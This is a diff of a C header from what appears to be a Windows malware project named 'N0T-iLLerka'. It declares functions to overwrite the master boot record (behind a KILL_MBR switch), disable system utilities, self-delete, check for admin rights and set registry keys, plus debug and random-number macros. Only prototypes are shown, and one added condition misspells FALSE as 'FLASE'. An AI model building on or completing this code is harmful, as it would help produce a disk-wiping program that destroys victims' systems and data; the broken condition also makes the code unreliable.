@@ -1,16 +1,6 @@
 //// N0T-iLLerka.h : N0T-iLLerka.X's main Header File ////
 #pragma once
 
-// Debug ErrorHandler Template (for C&P-ing) //
-/*
-	#ifdef DEBUG_MSG
-		fnErrorHandlerW(L"", NULL, L"", MB_OK | MB_ICON);
-	#endif // DEBUG_MSG
-*/
-
-// Precompiled Header //
-#include "pch.h"
-
 // Compiler/Linker //
 #pragma comment(linker,"\"/manifestdependency:type='win32' \
 name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
@@ -50,7 +40,12 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define nMAX_BUFFER_SIZE 0x2000000
 
 // Wrapper Macros //
-#define nRNG_RAN(nMin, nMax) ((nMin) + (fnCryptGenRandomNumber() % (((nMax) - (nMin)) + 1)))
+#define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
+#if DEBUG_MSG == 1
+#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...) fnErrorHandlerW(lpText, lpCaption, lpFunction, uType, __VA_ARGS__)
+#else
+#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
+#endif
 
 // Arrays/Sizes //
 extern const WCHAR szCharSet[];
@@ -75,8 +70,7 @@ BOOL fnSelfDeleteW(
 	_In_ WCHAR szCd[],
 	_In_ WCHAR szMfn[]
 );
-
-#ifdef KILL_MBR
+#if KILL_MBR == TRUE
 BOOL fnOverwriteMBR(VOID);
 #endif // KILL_MBR
 
@@ -92,10 +86,12 @@ BOOL fnCreateRegistryKeyW(
 BOOL fnCheckRegistryKeyW(
 	_In_ LPCWSTR lpSubKey
 );
+#if DISABLE_PROTECTIONS == FALSE
 BOOL fnDisableUtilities(VOID);
+#endif // !DISABLE_PROTECTIONS
 
 // Synchronization Functions //
-#ifndef DISABLE_SYNCHRONIZATION
+#if DISABLE_SYNCHRONIZATION == FLASE
 BOOL fnCheckMutexW(
 	_In_ LPCWSTR lpName
 );
@@ -123,6 +119,7 @@ BOOL fnSaveResourceW(
 	_In_ DWORD dwBufferSize
 );
 BOOL fnIsUserAdmin(VOID);
+#if DEBUG_MSG == TRUE
 VOID fnErrorHandlerW(
 	_In_opt_ LPCWSTR lpText,
 	_In_opt_ LPCWSTR lpCaption,
@@ -130,3 +127,4 @@ VOID fnErrorHandlerW(
 	_In_ UINT uType,
 	_In_opt_ ...
 );
+#endif // DEBUG_MSG
